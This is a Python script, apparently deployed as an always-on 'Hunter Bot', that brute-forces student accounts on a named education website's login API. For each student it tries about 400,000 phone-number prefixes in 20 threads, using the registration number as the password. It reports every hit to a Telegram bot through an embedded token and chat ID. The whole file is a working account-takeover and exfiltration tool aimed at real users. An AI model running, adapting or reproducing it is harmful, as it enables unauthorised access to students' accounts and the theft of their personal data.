import requests
import time
import os
import threading
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM")
CHAT_ID = os.environ.get("CHAT_ID", "1634075045")

API_URL = "https://www.eduintern.in/api/auth/login"
FILE_NAME = "students.txt" 
THREADS = 20 

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://www.eduintern.in",
    "Referer": "https://www.eduintern.in/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0"
}

def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

def check(phone, password):
    try:
        r = requests.post(API_URL, json={"phone": phone, "password": password}, headers=HEADERS, timeout=8)
        data = r.json() if r.text else {}
        
        # Tera wala success logic
        success = "student" in data or "user" in data or ("token" in data and "name" in data)
        
        return {
            "phone": phone,
            "status_code": r.status_code,
            "response": data,
            "success": success
        }
    except requests.exceptions.Timeout:
        return {"phone": phone, "status_code": "TIMEOUT", "success": False}
    except Exception as e:
        return {"phone": phone, "status_code": "ERROR", "response": str(e), "success": False}

def process_student(index, reg_no, last4):
    print(f"\n{'='*70}", flush=True)
    print(f"[{index}] TARGET START: Reg No {reg_no} (Ending: {last4})", flush=True)
    print(f"{'='*70}\n", flush=True)
    
    valid_first_digits = ['6', '7', '8', '9']
    prefixes = [f"{first_digit}{i:05d}" for first_digit in valid_first_digits for i in range(100000)]
    total = len(prefixes)
    
    found = None
    checked = 0
    start_time = time.time()
    error_count = 0
    success_count = 0
    fail_count = 0
    
    def process_phone(prefix6):
        nonlocal found
        if found: return None
        phone = prefix6 + last4
        
        # Retry system (Tera wala)
        attempt = 0
        while True:
            res = check(phone, reg_no)
            if res["success"]:
                return res
            if res["status_code"] == 401:
                return res
            if res["status_code"] in ["ERROR", "TIMEOUT"]:
                attempt += 1
                if attempt <= 3: continue
                return res
            return res

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = [ex.submit(process_phone, prefix) for prefix in prefixes]
        for future in as_completed(futures):
            checked += 1
            res = future.result()
            
            if res and res["success"]:
                found = res
                print(f"\n\n[+] ✅ ACCOUNT FOUND! [+]\n", flush=True)
                print(f"📞 Phone  : {res['phone']}", flush=True)
                print(f"📄 Response: {res['response']}", flush=True)
                
                msg = f"[{index}] {reg_no}    {res['phone']}  sus"
                send_telegram_msg(msg)
                break
            
            # Exact Style Live Logs
            if res:
                if res["status_code"] == "ERROR":
                    error_count += 1
                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: ERROR", flush=True)
                elif res["status_code"] == 401:
                    fail_count += 1
                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: 401", flush=True)
                elif res["status_code"] == 200:
                    success_count += 1
                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: 200 (No user data)", flush=True)
                elif res["status_code"] == "TIMEOUT":
                    error_count += 1
                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: TIMEOUT", flush=True)
                else:
                    print(f"[{checked}/{total}] 📞 {res['phone']} → Status: {res['status_code']}", flush=True)

    elapsed = time.time() - start_time
    print("\n" + "=" * 70, flush=True)
    print(f"[+] SCAN SUMMARY FOR {reg_no}", flush=True)
    print("=" * 70, flush=True)
    
    if found:
        print(f"[+] ACCOUNT FOUND: {found['phone']}", flush=True)
    else:
        print("[!] NO ACCOUNT FOUND!", flush=True)
        msg = f"[{index}] {reg_no}    no match number found"
        send_telegram_msg(msg)
        
    print(f"\n[+] Time: {elapsed:.2f}s", flush=True)
    print(f"[+] Speed: {checked/elapsed:.1f}/sec", flush=True)
    print(f"[+] Errors: {error_count}", flush=True)
    print(f"[+] 401 Failed: {fail_count}", flush=True)
    print(f"[+] 200 Success (No Data): {success_count}", flush=True)
    print("=" * 70 + "\n", flush=True)
    
    send_telegram_msg("--------------------------------\nNext target scan ho raha hai...")

def run_hunter():
    time.sleep(5)
    try:
        with open(FILE_NAME, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
            
        print(f"Total {len(lines)} lines mili. Kaam shuru...", flush=True)
        send_telegram_msg(f"🚀 Script start! Total {len(lines)} students process honge.")
        
        for i, line in enumerate(lines, start=1):
            parts = line.split()
            if len(parts) >= 2:
                process_student(i, parts[0], parts[1])
                
        send_telegram_msg("✅ Saare students process ho gaye!")
                
    except Exception as e:
        print("Error:", e, flush=True)
        send_telegram_msg(f"❌ Error: {str(e)}")

@app.route('/')
def home():
    return "Hunter Bot is running 24x7..."

if __name__ == "__main__":
    threading.Thread(target=run_hunter, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
